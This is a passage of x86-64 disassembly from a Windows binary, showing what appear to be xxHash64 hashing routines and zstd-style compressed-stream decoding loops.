   140001d34:	41 8b ca             	mov    %r10d,%ecx
   140001d37:	48 8d 05 32 ba 02 00 	lea    0x2ba32(%rip),%rax        # 0x14002d770
   140001d3e:	8b 04 90             	mov    (%rax,%rdx,4),%eax
   140001d41:	f7 d9                	neg    %ecx
   140001d43:	49 d3 eb             	shr    %cl,%r11
   140001d46:	4c 23 d8             	and    %rax,%r11
   140001d49:	41 0f b7 c0          	movzwl %r8w,%eax
   140001d4d:	41 c1 e8 10          	shr    $0x10,%r8d
   140001d51:	4c 03 d8             	add    %rax,%r11
   140001d54:	45 88 46 03          	mov    %r8b,0x3(%r14)
   140001d58:	49 83 c6 04          	add    $0x4,%r14
   140001d5c:	e9 8f fe ff ff       	jmp    0x140001bf0
   140001d61:	49 8d 98 fd 00 00 00 	lea    0xfd(%r8),%rbx
   140001d68:	4c 3b f3             	cmp    %rbx,%r14
   140001d6b:	0f 87 28 fd ff ff    	ja     0x140001a99
   140001d71:	0f 1f 40 00          	nopl   0x0(%rax)
   140001d75:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140001d7c:	00 00 00 00 
   140001d80:	47 8b 44 bd 04       	mov    0x4(%r13,%r15,4),%r8d
   140001d85:	4c 8b fe             	mov    %rsi,%r15
   140001d88:	41 8b c0             	mov    %r8d,%eax
   140001d8b:	c1 e8 18             	shr    $0x18,%eax
   140001d8e:	8b d0                	mov    %eax,%edx
   140001d90:	46 8d 0c 10          	lea    (%rax,%r10,1),%r9d
   140001d94:	41 8b c9             	mov    %r9d,%ecx
   140001d97:	48 8d 05 d2 b9 02 00 	lea    0x2b9d2(%rip),%rax        # 0x14002d770
   140001d9e:	8b 04 90             	mov    (%rax,%rdx,4),%eax
   140001da1:	f7 d9                	neg    %ecx
   140001da3:	49 d3 ef             	shr    %cl,%r15
   140001da6:	4c 23 f8             	and    %rax,%r15
   140001da9:	41 0f b7 c0          	movzwl %r8w,%eax
   140001dad:	41 c1 e8 10          	shr    $0x10,%r8d
   140001db1:	4c 03 f8             	add    %rax,%r15
   140001db4:	45 88 06             	mov    %r8b,(%r14)
   140001db7:	49 ff c6             	inc    %r14
   140001dba:	41 83 f9 40          	cmp    $0x40,%r9d
   140001dbe:	0f 87 04 01 00 00    	ja     0x140001ec8
   140001dc4:	49 3b fc             	cmp    %r12,%rdi
   140001dc7:	72 10                	jb     0x140001dd9
   140001dc9:	41 8b c1             	mov    %r9d,%eax
   140001dcc:	48 c1 e8 03          	shr    $0x3,%rax
   140001dd0:	48 2b f8             	sub    %rax,%rdi
   140001dd3:	41 83 e1 07          	and    $0x7,%r9d
   140001dd7:	eb 33                	jmp    0x140001e0c
   140001dd9:	48 3b fd             	cmp    %rbp,%rdi
   140001ddc:	74 31                	je     0x140001e0f
   140001dde:	41 8b c9             	mov    %r9d,%ecx
   140001de1:	48 8b c7             	mov    %rdi,%rax
   140001de4:	c1 e9 03             	shr    $0x3,%ecx
   140001de7:	48 2b c1             	sub    %rcx,%rax
   140001dea:	48 3b c5             	cmp    %rbp,%rax
   140001ded:	73 10                	jae    0x140001dff
   140001def:	8b c7                	mov    %edi,%eax
   140001df1:	2b c5                	sub    %ebp,%eax
   140001df3:	48 2b f8             	sub    %rax,%rdi
   140001df6:	8d 04 c5 00 00 00 00 	lea    0x0(,%rax,8),%eax
   140001dfd:	eb 0a                	jmp    0x140001e09
   140001dff:	48 2b f9             	sub    %rcx,%rdi
   140001e02:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   140001e09:	44 2b c8             	sub    %eax,%r9d
   140001e0c:	48 8b 37             	mov    (%rdi),%rsi
   140001e0f:	4c 3b f3             	cmp    %rbx,%r14
   140001e12:	0f 87 81 fc ff ff    	ja     0x140001a99
   140001e18:	47 8b 44 9d 04       	mov    0x4(%r13,%r11,4),%r8d
   140001e1d:	4c 8b de             	mov    %rsi,%r11
   140001e20:	41 8b c0             	mov    %r8d,%eax
   140001e23:	c1 e8 18             	shr    $0x18,%eax
   140001e26:	8b d0                	mov    %eax,%edx
   140001e28:	46 8d 14 08          	lea    (%rax,%r9,1),%r10d
   140001e2c:	41 8b ca             	mov    %r10d,%ecx
   140001e2f:	48 8d 05 3a b9 02 00 	lea    0x2b93a(%rip),%rax        # 0x14002d770
   140001e36:	8b 04 90             	mov    (%rax,%rdx,4),%eax
   140001e39:	f7 d9                	neg    %ecx
   140001e3b:	49 d3 eb             	shr    %cl,%r11
   140001e3e:	4c 23 d8             	and    %rax,%r11
   140001e41:	41 0f b7 c0          	movzwl %r8w,%eax
   140001e45:	41 c1 e8 10          	shr    $0x10,%r8d
   140001e49:	4c 03 d8             	add    %rax,%r11
   140001e4c:	45 88 06             	mov    %r8b,(%r14)
   140001e4f:	49 ff c6             	inc    %r14
   140001e52:	41 83 fa 40          	cmp    $0x40,%r10d
   140001e56:	77 59                	ja     0x140001eb1
   140001e58:	49 3b fc             	cmp    %r12,%rdi
   140001e5b:	72 10                	jb     0x140001e6d
   140001e5d:	41 8b c2             	mov    %r10d,%eax
   140001e60:	48 c1 e8 03          	shr    $0x3,%rax
   140001e64:	48 2b f8             	sub    %rax,%rdi
   140001e67:	41 83 e2 07          	and    $0x7,%r10d
   140001e6b:	eb 33                	jmp    0x140001ea0
   140001e6d:	48 3b fd             	cmp    %rbp,%rdi
   140001e70:	74 31                	je     0x140001ea3
   140001e72:	41 8b ca             	mov    %r10d,%ecx
   140001e75:	48 8b c7             	mov    %rdi,%rax
   140001e78:	c1 e9 03             	shr    $0x3,%ecx
   140001e7b:	48 2b c1             	sub    %rcx,%rax
   140001e7e:	48 3b c5             	cmp    %rbp,%rax
   140001e81:	73 10                	jae    0x140001e93
   140001e83:	8b c7                	mov    %edi,%eax
   140001e85:	2b c5                	sub    %ebp,%eax
   140001e87:	48 2b f8             	sub    %rax,%rdi
   140001e8a:	8d 04 c5 00 00 00 00 	lea    0x0(,%rax,8),%eax
   140001e91:	eb 0a                	jmp    0x140001e9d
   140001e93:	48 2b f9             	sub    %rcx,%rdi
   140001e96:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   140001e9d:	44 2b d0             	sub    %eax,%r10d
   140001ea0:	48 8b 37             	mov    (%rdi),%rsi
   140001ea3:	4c 3b f3             	cmp    %rbx,%r14
   140001ea6:	0f 86 d4 fe ff ff    	jbe    0x140001d80
   140001eac:	e9 e8 fb ff ff       	jmp    0x140001a99
   140001eb1:	43 0f b6 44 bd 06    	movzbl 0x6(%r13,%r15,4),%eax
   140001eb7:	41 88 06             	mov    %al,(%r14)
   140001eba:	4c 2b 74 24 40       	sub    0x40(%rsp),%r14
   140001ebf:	49 8d 46 01          	lea    0x1(%r14),%rax
   140001ec3:	e9 d8 fb ff ff       	jmp    0x140001aa0
   140001ec8:	43 0f b6 44 9d 06    	movzbl 0x6(%r13,%r11,4),%eax
   140001ece:	41 88 06             	mov    %al,(%r14)
   140001ed1:	4c 2b 74 24 40       	sub    0x40(%rsp),%r14
   140001ed6:	49 8d 46 01          	lea    0x1(%r14),%rax
   140001eda:	e9 c1 fb ff ff       	jmp    0x140001aa0
   140001edf:	cc                   	int3
   140001ee0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001ee5:	53                   	push   %rbx
   140001ee6:	55                   	push   %rbp
   140001ee7:	56                   	push   %rsi
   140001ee8:	57                   	push   %rdi
   140001ee9:	48 83 ec 38          	sub    $0x38,%rsp
   140001eed:	48 8b d9             	mov    %rcx,%rbx
   140001ef0:	4a 8d 2c 02          	lea    (%rdx,%r8,1),%rbp
   140001ef4:	8b 49 48             	mov    0x48(%rcx),%ecx
   140001ef7:	49 8b f8             	mov    %r8,%rdi
   140001efa:	48 8b f2             	mov    %rdx,%rsi
   140001efd:	48 89 6c 24 78       	mov    %rbp,0x78(%rsp)
   140001f02:	4c 01 03             	add    %r8,(%rbx)
   140001f05:	4a 8d 04 01          	lea    (%rcx,%r8,1),%rax
   140001f09:	48 83 f8 20          	cmp    $0x20,%rax
   140001f0d:	73 1f                	jae    0x140001f2e
   140001f0f:	48 85 d2             	test   %rdx,%rdx
   140001f12:	74 0c                	je     0x140001f20
   140001f14:	48 83 c1 28          	add    $0x28,%rcx
   140001f18:	48 03 cb             	add    %rbx,%rcx
   140001f1b:	e8 00 10 02 00       	call   0x140022f20
   140001f20:	01 7b 48             	add    %edi,0x48(%rbx)
   140001f23:	33 c0                	xor    %eax,%eax
   140001f25:	48 83 c4 38          	add    $0x38,%rsp
   140001f29:	5f                   	pop    %rdi
   140001f2a:	5e                   	pop    %rsi
   140001f2b:	5d                   	pop    %rbp
   140001f2c:	5b                   	pop    %rbx
   140001f2d:	c3                   	ret
   140001f2e:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   140001f33:	48 8d 7b 28          	lea    0x28(%rbx),%rdi
   140001f37:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140001f3c:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140001f41:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140001f46:	85 c9                	test   %ecx,%ecx
   140001f48:	0f 84 9e 00 00 00    	je     0x140001fec
   140001f4e:	bf 20 00 00 00       	mov    $0x20,%edi
   140001f53:	44 8b c7             	mov    %edi,%r8d
   140001f56:	44 2b c1             	sub    %ecx,%r8d
   140001f59:	48 83 c1 28          	add    $0x28,%rcx
   140001f5d:	48 03 cb             	add    %rbx,%rcx
   140001f60:	e8 bb 0f 02 00       	call   0x140022f20
   140001f65:	48 8b 43 28          	mov    0x28(%rbx),%rax
   140001f69:	48 b9 4f eb d4 27 3d 	movabs $0xc2b2ae3d27d4eb4f,%rcx
   140001f70:	ae b2 c2 
   140001f73:	2b 7b 48             	sub    0x48(%rbx),%edi
   140001f76:	48 ba 87 ca eb 85 b1 	movabs $0x9e3779b185ebca87,%rdx
   140001f7d:	79 37 9e 
   140001f80:	48 0f af c1          	imul   %rcx,%rax
   140001f84:	48 03 43 08          	add    0x8(%rbx),%rax
   140001f88:	48 c1 c0 1f          	rol    $0x1f,%rax
   140001f8c:	48 0f af c2          	imul   %rdx,%rax
   140001f90:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001f94:	48 8b 43 30          	mov    0x30(%rbx),%rax
   140001f98:	48 0f af c1          	imul   %rcx,%rax
   140001f9c:	48 03 43 10          	add    0x10(%rbx),%rax
   140001fa0:	48 c1 c0 1f          	rol    $0x1f,%rax
   140001fa4:	48 0f af c2          	imul   %rdx,%rax
   140001fa8:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001fac:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140001fb0:	48 0f af c1          	imul   %rcx,%rax
   140001fb4:	48 03 43 18          	add    0x18(%rbx),%rax
   140001fb8:	48 c1 c0 1f          	rol    $0x1f,%rax
   140001fbc:	48 0f af c2          	imul   %rdx,%rax
   140001fc0:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140001fc4:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140001fc8:	48 0f af c1          	imul   %rcx,%rax
   140001fcc:	c7 43 48 00 00 00 00 	movl   $0x0,0x48(%rbx)
   140001fd3:	48 03 43 20          	add    0x20(%rbx),%rax
   140001fd7:	48 c1 c0 1f          	rol    $0x1f,%rax
   140001fdb:	48 0f af c2          	imul   %rdx,%rax
   140001fdf:	48 89 43 20          	mov    %rax,0x20(%rbx)
   140001fe3:	8b c7                	mov    %edi,%eax
   140001fe5:	48 8d 7b 28          	lea    0x28(%rbx),%rdi
   140001fe9:	48 03 f0             	add    %rax,%rsi
   140001fec:	48 8d 46 20          	lea    0x20(%rsi),%rax
   140001ff0:	48 3b c5             	cmp    %rbp,%rax
   140001ff3:	0f 87 96 00 00 00    	ja     0x14000208f
   140001ff9:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   140001ffd:	4c 8d 5d e0          	lea    -0x20(%rbp),%r11
   140002001:	4c 8b 43 10          	mov    0x10(%rbx),%r8
   140002005:	48 bd 87 ca eb 85 b1 	movabs $0x9e3779b185ebca87,%rbp
   14000200c:	79 37 9e 
   14000200f:	4c 8b 4b 18          	mov    0x18(%rbx),%r9
   140002013:	4c 8b 53 20          	mov    0x20(%rbx),%r10
   140002017:	48 bb 4f eb d4 27 3d 	movabs $0xc2b2ae3d27d4eb4f,%rbx
   14000201e:	ae b2 c2 
   140002021:	48 8b 06             	mov    (%rsi),%rax
   140002024:	48 0f af c3          	imul   %rbx,%rax
   140002028:	48 03 d0             	add    %rax,%rdx
   14000202b:	48 8b 46 08          	mov    0x8(%rsi),%rax
   14000202f:	48 0f af c3          	imul   %rbx,%rax
   140002033:	48 c1 c2 1f          	rol    $0x1f,%rdx
   140002037:	4c 03 c0             	add    %rax,%r8
   14000203a:	48 8b 46 10          	mov    0x10(%rsi),%rax
   14000203e:	48 0f af c3          	imul   %rbx,%rax
   140002042:	48 0f af d5          	imul   %rbp,%rdx
   140002046:	4c 03 c8             	add    %rax,%r9
   140002049:	49 c1 c0 1f          	rol    $0x1f,%r8
   14000204d:	48 8b 46 18          	mov    0x18(%rsi),%rax
   140002051:	48 83 c6 20          	add    $0x20,%rsi
   140002055:	48 0f af c3          	imul   %rbx,%rax
   140002059:	4c 0f af c5          	imul   %rbp,%r8
   14000205d:	4c 03 d0             	add    %rax,%r10
   140002060:	49 c1 c1 1f          	rol    $0x1f,%r9
   140002064:	49 c1 c2 1f          	rol    $0x1f,%r10
   140002068:	4c 0f af d5          	imul   %rbp,%r10
   14000206c:	4c 0f af cd          	imul   %rbp,%r9
   140002070:	49 3b f3             	cmp    %r11,%rsi
   140002073:	76 ac                	jbe    0x140002021
   140002075:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000207a:	48 8b 6c 24 78       	mov    0x78(%rsp),%rbp
   14000207f:	48 89 53 08          	mov    %rdx,0x8(%rbx)
   140002083:	4c 89 43 10          	mov    %r8,0x10(%rbx)
   140002087:	4c 89 4b 18          	mov    %r9,0x18(%rbx)
   14000208b:	4c 89 53 20          	mov    %r10,0x20(%rbx)
   14000208f:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   140002094:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   140002099:	4c 8b 6c 24 30       	mov    0x30(%rsp),%r13
   14000209e:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   1400020a3:	48 3b f5             	cmp    %rbp,%rsi
   1400020a6:	73 16                	jae    0x1400020be
   1400020a8:	4c 8b c5             	mov    %rbp,%r8
   1400020ab:	48 8b d6             	mov    %rsi,%rdx
   1400020ae:	4c 2b c6             	sub    %rsi,%r8
   1400020b1:	48 8b cf             	mov    %rdi,%rcx
   1400020b4:	e8 67 0e 02 00       	call   0x140022f20
   1400020b9:	2b ee                	sub    %esi,%ebp
   1400020bb:	89 6b 48             	mov    %ebp,0x48(%rbx)
   1400020be:	33 c0                	xor    %eax,%eax
   1400020c0:	48 83 c4 38          	add    $0x38,%rsp
   1400020c4:	5f                   	pop    %rdi
   1400020c5:	5e                   	pop    %rsi
   1400020c6:	5d                   	pop    %rbp
   1400020c7:	5b                   	pop    %rbx
   1400020c8:	c3                   	ret
   1400020c9:	cc                   	int3
   1400020ca:	cc                   	int3
   1400020cb:	cc                   	int3
   1400020cc:	cc                   	int3
   1400020cd:	cc                   	int3
   1400020ce:	cc                   	int3
   1400020cf:	cc                   	int3
   1400020d0:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400020d5:	56                   	push   %rsi
   1400020d6:	41 54                	push   %r12
   1400020d8:	41 55                	push   %r13
   1400020da:	41 57                	push   %r15
   1400020dc:	8b 69 48             	mov    0x48(%rcx),%ebp
   1400020df:	48 8d 71 28          	lea    0x28(%rcx),%rsi
   1400020e3:	48 83 c5 28          	add    $0x28,%rbp
   1400020e7:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400020ec:	4c 8b 31             	mov    (%rcx),%r14
   1400020ef:	48 03 e9             	add    %rcx,%rbp
   1400020f2:	49 bd c5 67 56 16 2f 	movabs $0x27d4eb2f165667c5,%r13
   1400020f9:	eb d4 27 
   1400020fc:	49 bc 4f eb d4 27 3d 	movabs $0xc2b2ae3d27d4eb4f,%r12
   140002103:	ae b2 c2 
   140002106:	49 bf 87 ca eb 85 b1 	movabs $0x9e3779b185ebca87,%r15
   14000210d:	79 37 9e 
   140002110:	49 b8 9d 51 4d 3d 88 	movabs $0x7a1435883d4d519d,%r8
   140002117:	35 14 7a 
   14000211a:	49 83 fe 20          	cmp    $0x20,%r14
   14000211e:	0f 82 ba 00 00 00    	jb     0x1400021de
   140002124:	4c 8b 51 08          	mov    0x8(%rcx),%r10
   140002128:	4c 8b 41 10          	mov    0x10(%rcx),%r8
   14000212c:	49 8b c2             	mov    %r10,%rax
   14000212f:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140002133:	4d 8b c8             	mov    %r8,%r9
   140002136:	48 8b 49 20          	mov    0x20(%rcx),%rcx
   14000213a:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000213f:	48 8b da             	mov    %rdx,%rbx
   140002142:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140002147:	48 8b f9             	mov    %rcx,%rdi
   14000214a:	49 0f af c4          	imul   %r12,%rax
   14000214e:	49 0f af dc          	imul   %r12,%rbx
   140002152:	49 0f af fc          	imul   %r12,%rdi
   140002156:	4d 0f af cc          	imul   %r12,%r9
   14000215a:	48 c1 c0 1f          	rol    $0x1f,%rax
   14000215e:	49 0f af c7          	imul   %r15,%rax
   140002162:	49 c1 c0 07          	rol    $0x7,%r8
   140002166:	48 c1 c3 1f          	rol    $0x1f,%rbx
   14000216a:	49 0f af df          	imul   %r15,%rbx
   14000216e:	48 c1 c2 0c          	rol    $0xc,%rdx
   140002172:	48 c1 c1 12          	rol    $0x12,%rcx
   140002176:	49 d1 c2             	rol    $1,%r10
   140002179:	48 c1 c7 1f          	rol    $0x1f,%rdi
   14000217d:	49 c1 c1 1f          	rol    $0x1f,%r9
   140002181:	4d 0f af cf          	imul   %r15,%r9
   140002185:	49 0f af ff          	imul   %r15,%rdi
   140002189:	4c 8d 1c 11          	lea    (%rcx,%rdx,1),%r11
   14000218d:	4d 03 d8             	add    %r8,%r11
   140002190:	49 b8 9d 51 4d 3d 88 	movabs $0x7a1435883d4d519d,%r8
   140002197:	35 14 7a 
   14000219a:	4d 03 da             	add    %r10,%r11
   14000219d:	4c 33 d8             	xor    %rax,%r11
   1400021a0:	48 b8 63 ae b2 c2 77 	movabs $0x85ebca77c2b2ae63,%rax
   1400021a7:	ca eb 85 
   1400021aa:	4d 0f af df          	imul   %r15,%r11
   1400021ae:	4d 2b d8             	sub    %r8,%r11
   1400021b1:	4d 33 d9             	xor    %r9,%r11
   1400021b4:	4d 0f af df          	imul   %r15,%r11
   1400021b8:	4d 2b d8             	sub    %r8,%r11
   1400021bb:	4c 33 db             	xor    %rbx,%r11
   1400021be:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   1400021c3:	4d 0f af df          	imul   %r15,%r11
   1400021c7:	4d 2b d8             	sub    %r8,%r11
   1400021ca:	4c 33 df             	xor    %rdi,%r11
   1400021cd:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400021d2:	4d 0f af df          	imul   %r15,%r11
   1400021d6:	49 03 c3             	add    %r11,%rax
   1400021d9:	49 03 c6             	add    %r14,%rax
   1400021dc:	eb 08                	jmp    0x1400021e6
   1400021de:	4b 8d 04 2e          	lea    (%r14,%r13,1),%rax
   1400021e2:	48 03 41 18          	add    0x18(%rcx),%rax
   1400021e6:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   1400021eb:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   1400021ef:	48 3b d5             	cmp    %rbp,%rdx
   1400021f2:	77 36                	ja     0x14000222a
   1400021f4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400021f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400021ff:	00 
   140002200:	48 8b 0e             	mov    (%rsi),%rcx
   140002203:	48 83 c2 08          	add    $0x8,%rdx
   140002207:	49 0f af cc          	imul   %r12,%rcx
   14000220b:	48 83 c6 08          	add    $0x8,%rsi
   14000220f:	48 c1 c1 1f          	rol    $0x1f,%rcx
   140002213:	49 0f af cf          	imul   %r15,%rcx
   140002217:	48 33 c1             	xor    %rcx,%rax
   14000221a:	48 c1 c0 1b          	rol    $0x1b,%rax
   14000221e:	49 0f af c7          	imul   %r15,%rax
   140002222:	49 2b c0             	sub    %r8,%rax
   140002225:	48 3b d5             	cmp    %rbp,%rdx
   140002228:	76 d6                	jbe    0x140002200
   14000222a:	48 8d 56 04          	lea    0x4(%rsi),%rdx
   14000222e:	49 b8 f9 79 37 9e b1 	movabs $0x165667b19e3779f9,%r8
   140002235:	67 56 16 
   140002238:	48 3b d5             	cmp    %rbp,%rdx
   14000223b:	77 17                	ja     0x140002254
   14000223d:	8b 0e                	mov    (%rsi),%ecx
   14000223f:	48 8b f2             	mov    %rdx,%rsi
   140002242:	49 0f af cf          	imul   %r15,%rcx
   140002246:	48 33 c1             	xor    %rcx,%rax
   140002249:	48 c1 c0 17          	rol    $0x17,%rax
   14000224d:	49 0f af c4          	imul   %r12,%rax
   140002251:	49 03 c0             	add    %r8,%rax
   140002254:	48 3b f5             	cmp    %rbp,%rsi
   140002257:	73 21                	jae    0x14000227a
   140002259:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002260:	0f b6 0e             	movzbl (%rsi),%ecx
   140002263:	48 ff c6             	inc    %rsi
   140002266:	49 0f af cd          	imul   %r13,%rcx
   14000226a:	48 33 c1             	xor    %rcx,%rax
   14000226d:	48 c1 c0 0b          	rol    $0xb,%rax
   140002271:	49 0f af c7          	imul   %r15,%rax
   140002275:	48 3b f5             	cmp    %rbp,%rsi
   140002278:	72 e6                	jb     0x140002260
   14000227a:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   14000227f:	48 8b c8             	mov    %rax,%rcx
   140002282:	48 c1 e9 21          	shr    $0x21,%rcx
   140002286:	48 33 c8             	xor    %rax,%rcx
   140002289:	49 0f af cc          	imul   %r12,%rcx
   14000228d:	48 8b d1             	mov    %rcx,%rdx
   140002290:	48 c1 ea 1d          	shr    $0x1d,%rdx
   140002294:	48 33 d1             	xor    %rcx,%rdx
   140002297:	49 0f af d0          	imul   %r8,%rdx
   14000229b:	48 8b c2             	mov    %rdx,%rax
   14000229e:	48 c1 e8 20          	shr    $0x20,%rax
   1400022a2:	48 33 c2             	xor    %rdx,%rax
   1400022a5:	41 5f                	pop    %r15
   1400022a7:	41 5d                	pop    %r13
   1400022a9:	41 5c                	pop    %r12
   1400022ab:	5e                   	pop    %rsi
   1400022ac:	c3                   	ret
   1400022ad:	cc                   	int3
   1400022ae:	cc                   	int3
   1400022af:	cc                   	int3
   1400022b0:	40 53                	rex push %rbx
   1400022b2:	55                   	push   %rbp
   1400022b3:	56                   	push   %rsi
   1400022b4:	57                   	push   %rdi
   1400022b5:	41 54                	push   %r12
   1400022b7:	41 55                	push   %r13
   1400022b9:	41 56                	push   %r14
   1400022bb:	41 57                	push   %r15
   1400022bd:	48 83 ec 68          	sub    $0x68,%rsp
   1400022c1:	48 8b 05 38 ed 02 00 	mov    0x2ed38(%rip),%rax        # 0x140031000
   1400022c8:	48 33 c4             	xor    %rsp,%rax
   1400022cb:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400022d0:	48 8b ac 24 d0 00 00 	mov    0xd0(%rsp),%rbp
   1400022d7:	00 
   1400022d8:	33 ff                	xor    %edi,%edi
   1400022da:	44 8b 22             	mov    (%rdx),%r12d
   1400022dd:	45 33 ff             	xor    %r15d,%r15d
   1400022e0:	41 ff c4             	inc    %r12d
   1400022e3:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   1400022e8:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400022ed:	4d 8b e9             	mov    %r9,%r13
   1400022f0:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400022f5:	49 8d 34 29          	lea    (%r9,%rbp,1),%rsi
   1400022f9:	4d 8b f0             	mov    %r8,%r14
   1400022fc:	49 8b d9             	mov    %r9,%rbx
   1400022ff:	48 83 fd 08          	cmp    $0x8,%rbp
   140002303:	73 58                	jae    0x14000235d
   140002305:	4c 8b c5             	mov    %rbp,%r8
   140002308:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   14000230d:	49 8b d1             	mov    %r9,%rdx
   140002310:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140002315:	e8 06 0c 02 00       	call   0x140022f20
   14000231a:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000231f:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140002324:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140002329:	4d 8b c6             	mov    %r14,%r8
   14000232c:	48 c7 44 24 20 08 00 	movq   $0x8,0x20(%rsp)
   140002333:	00 00 
   140002335:	e8 76 ff ff ff       	call   0x1400022b0
   14000233a:	48 8b c8             	mov    %rax,%rcx
   14000233d:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002341:	0f 87 3e 02 00 00    	ja     0x140002585
   140002347:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   14000234e:	48 3b cd             	cmp    %rbp,%rcx
   140002351:	48 0f 47 c8          	cmova  %rax,%rcx
   140002355:	48 8b c1             	mov    %rcx,%rax
   140002358:	e9 28 02 00 00       	jmp    0x140002585
   14000235d:	45 8b c4             	mov    %r12d,%r8d
   140002360:	33 d2                	xor    %edx,%edx
   140002362:	4d 03 c0             	add    %r8,%r8
   140002365:	e8 f6 07 02 00       	call   0x140022b60
   14000236a:	45 8b 45 00          	mov    0x0(%r13),%r8d
   14000236e:	41 8b c8             	mov    %r8d,%ecx
   140002371:	83 e1 0f             	and    $0xf,%ecx
   140002374:	83 c1 05             	add    $0x5,%ecx
   140002377:	83 f9 0f             	cmp    $0xf,%ecx
   14000237a:	76 0c                	jbe    0x140002388
   14000237c:	48 c7 c0 d4 ff ff ff 	mov    $0xffffffffffffffd4,%rax
   140002383:	e9 fd 01 00 00       	jmp    0x140002585
   140002388:	41 89 0e             	mov    %ecx,(%r14)
   14000238b:	44 8d 69 01          	lea    0x1(%rcx),%r13d
   14000238f:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140002395:	41 c1 e8 04          	shr    $0x4,%r8d
   140002399:	41 d3 e6             	shl    %cl,%r14d
   14000239c:	48 8d 6e f9          	lea    -0x7(%rsi),%rbp
   1400023a0:	ba 04 00 00 00       	mov    $0x4,%edx
   1400023a5:	45 8d 5e 01          	lea    0x1(%r14),%r11d
   1400023a9:	44 8b d6             	mov    %esi,%r10d
   1400023ac:	45 85 ff             	test   %r15d,%r15d
   1400023af:	0f 84 c2 00 00 00    	je     0x140002477
   1400023b5:	41 8b c0             	mov    %r8d,%eax
   1400023b8:	45 33 ff             	xor    %r15d,%r15d
   1400023bb:	f7 d0                	not    %eax
   1400023bd:	0f ba e8 1f          	bts    $0x1f,%eax
   1400023c1:	44 0f bc c8          	bsf    %eax,%r9d
   1400023c5:	41 d1 e9             	shr    $1,%r9d
   1400023c8:	41 83 f9 0c          	cmp    $0xc,%r9d
   1400023cc:	72 41                	jb     0x14000240f
   1400023ce:	66 90                	xchg   %ax,%ax
   1400023d0:	83 c7 24             	add    $0x24,%edi
   1400023d3:	48 3b dd             	cmp    %rbp,%rbx
   1400023d6:	77 06                	ja     0x1400023de
   1400023d8:	48 83 c3 03          	add    $0x3,%rbx
   1400023dc:	eb 10                	jmp    0x1400023ee
   1400023de:	41 2b da             	sub    %r10d,%ebx
   1400023e1:	8d 14 da             	lea    (%rdx,%rbx,8),%edx
   1400023e4:	83 c2 f8             	add    $0xfffffff8,%edx
   1400023e7:	48 8d 5e fc          	lea    -0x4(%rsi),%rbx
   1400023eb:	83 e2 1f             	and    $0x1f,%edx
   1400023ee:	44 8b 03             	mov    (%rbx),%r8d
   1400023f1:	8b ca                	mov    %edx,%ecx
   1400023f3:	41 d3 e8             	shr    %cl,%r8d
   1400023f6:	44 8b d6             	mov    %esi,%r10d
   1400023f9:	41 8b c0             	mov    %r8d,%eax
   1400023fc:	f7 d0                	not    %eax
   1400023fe:	0f ba e8 1f          	bts    $0x1f,%eax
   140002402:	44 0f bc c8          	bsf    %eax,%r9d
   140002406:	41 d1 e9             	shr    $1,%r9d
   140002409:	41 83 f9 0c          	cmp    $0xc,%r9d
   14000240d:	73 c1                	jae    0x1400023d0
   14000240f:	43 8d 0c 09          	lea    (%r9,%r9,1),%ecx
   140002413:	83 c2 02             	add    $0x2,%edx
   140002416:	41 d3 e8             	shr    %cl,%r8d
   140002419:	42 8d 3c 4f          	lea    (%rdi,%r9,2),%edi
   14000241d:	41 83 e0 03          	and    $0x3,%r8d
   140002421:	41 03 f9             	add    %r9d,%edi
   140002424:	41 03 f8             	add    %r8d,%edi
   140002427:	03 d1                	add    %ecx,%edx
   140002429:	41 3b fc             	cmp    %r12d,%edi
   14000242c:	0f 83 17 01 00 00    	jae    0x140002549
   140002432:	48 3b dd             	cmp    %rbp,%rbx
   140002435:	76 29                	jbe    0x140002460
   140002437:	8b c2                	mov    %edx,%eax
   140002439:	4c 8d 46 fc          	lea    -0x4(%rsi),%r8
   14000243d:	c1 f8 03             	sar    $0x3,%eax
   140002440:	48 63 c8             	movslq %eax,%rcx
   140002443:	48 03 cb             	add    %rbx,%rcx
   140002446:	49 3b c8             	cmp    %r8,%rcx
   140002449:	76 15                	jbe    0x140002460
